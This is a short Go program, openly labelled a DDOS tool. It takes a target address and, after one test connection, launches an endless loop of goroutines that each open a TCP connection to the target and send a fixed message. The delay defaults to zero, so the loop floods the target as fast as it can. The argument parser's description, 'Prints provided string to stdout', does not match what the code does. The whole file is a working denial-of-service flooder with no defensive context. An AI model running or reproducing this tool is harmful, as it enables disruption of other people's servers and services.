package main

import (
	"fmt"
	"github.com/akamensky/argparse"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

func ddos(address string) {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Printf("Couldn't connect to server (%v)...", err)
	}
	fmt.Fprint(conn, "Message18CharsLong")
	conn.Close()
}

func main() {
	log.SetFlags(3)

	parser := argparse.NewParser("print", "Prints provided string to stdout")
	address := parser.String("a", "address", &argparse.Options{Required: true, Help: "Address to DDOS"})
	delay := parser.Int("d", "delay", &argparse.Options{Required: false, Help: "Packet delay", Default: 0})
	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		return
	}

	if !strings.Contains(*address, ":") {
		*address += ":80"
	}

	conn, err := net.Dial("tcp", *address)
	if err != nil {
		log.Fatal(err)
	}
	_, err = fmt.Fprintf(conn, "Message18CharsLong")
	if err != nil {
		panic(err)
	}
	err = conn.Close()
	if err != nil {
		panic(err)
	}

	log.Printf("Starting DDOS...")

	for {
		go ddos(*address)
		time.Sleep(time.Millisecond * time.Duration(*delay))
	}
}
